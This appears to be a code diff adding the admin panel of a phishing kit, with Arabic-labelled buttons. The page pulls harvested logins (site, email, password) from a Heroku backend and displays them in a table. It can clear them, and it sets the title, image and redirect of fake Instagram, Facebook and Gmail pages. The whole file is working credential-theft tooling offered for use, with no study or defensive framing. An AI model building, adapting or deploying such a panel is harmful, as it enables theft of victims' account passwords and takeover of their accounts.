@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+        <style>
+            table {
+                  border-collapse: collapse;
+                  width: 100%;
+                }
+
+                th, td {
+                  border: 1px solid #000;
+                  text-align: left;
+                  padding: 8px;
+                }
+
+                tr:nth-child(even){background-color: #f2f2f2}
+
+                th {
+                  background-color: #11B7C8;
+                  color: white;
+            }
+        </style>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script type="text/javascript">
+            function json_to_table(data) {
+                const table = document.getElementById("TABLE");
+                for (const s in data) {
+                    var row = table.insertRow();
+                    var cell = row.insertCell();
+                    cell.innerHTML = s;
+                    var cell = row.insertCell();
+                    cell.innerHTML = data[s]["site"];
+                    var cell = row.insertCell();
+                    cell.innerHTML = data[s]["email"];
+                    var cell = row.insertCell();
+                    cell.innerHTML = data[s]["password"];
+                }
+            }
+            function get_logins() {
+                document.getElementById('option').style.display = "none";
+                document.getElementById('GETLOGINS').style.display = "";
+                $.ajax({
+                    url:"https://zaidfalah.herokuapp.com/view_logins",
+                    type:"GET",
+                    dataType:"json",
+                    success:function(r){json_to_table(r)}
+                    }
+                )
+            }
+            function update_links(){
+                document.getElementById('option').style.display = "none";
+                document.getElementById('UPDATELINKS').style.display = "";
+            }
+            function update() {
+                let o = {"site": document.getElementById('sites').value, "title": document.getElementById('title').value, "image": document.getElementById('image').value, "redirect": document.getElementById('redirect').value}
+                $.ajax({
+                    url:"https://zaidfalah.herokuapp.com/update_links",
+                    type:"POST",
+                    dataType:"json",
+                    data: o,
+                    success:function(r){alert(r.a)}
+                    }
+                )
+            }
+            function clear_logins(){
+                $.ajax({
+                    url:"https://zaidfalah.herokuapp.com/clear_logins",
+                    type:"POST",
+                    dataType:"json",
+                    success:function(r){alert(r.a)}
+                    }
+                )
+
+            }
+        </script>
+
+    </head>
+    <body>
+        <div id="option">
+            <button type="button" name="button" onclick="update_links()">تعديل الروابط</button>
+            <button type="button" name="button" onclick="get_logins()">عرض تسجيلات الدخول</button>
+        </div>
+        <div id="GETLOGINS" style="display: none">
+            <table id="TABLE">
+                <tr>
+                    <th>s</th>
+                    <th>website</th>
+                    <th>email</th>
+                    <th>password</th>
+                </tr>
+            </table><br><br>
+            <button type="button" name="button" onclick="clear_logins()">مسح التسجيلات</button>
+
+        </div>
+        <div id="UPDATELINKS" style="display: none">
+            <select name="sites" id="sites">
+                <option value="instagram">instagram</option>
+                <option value="facebook">facebook</option>
+                <option value="gmail">gmail</option>
+            </select>
+            <br><br>
+            <span>title:</span>
+            <input type="text" name="title" value="" id="title"><br><br>
+            <span>image:</span>
+            <input type="text" name="title" value="" id="image"><br><br>
+            <span>redirect:</span>
+            <input type="text" name="title" value="" id="redirect"><br><br>
+            <button type="button" name="button" onclick="update()">update</button>
+
+        </div>
+    </body>
+</html>
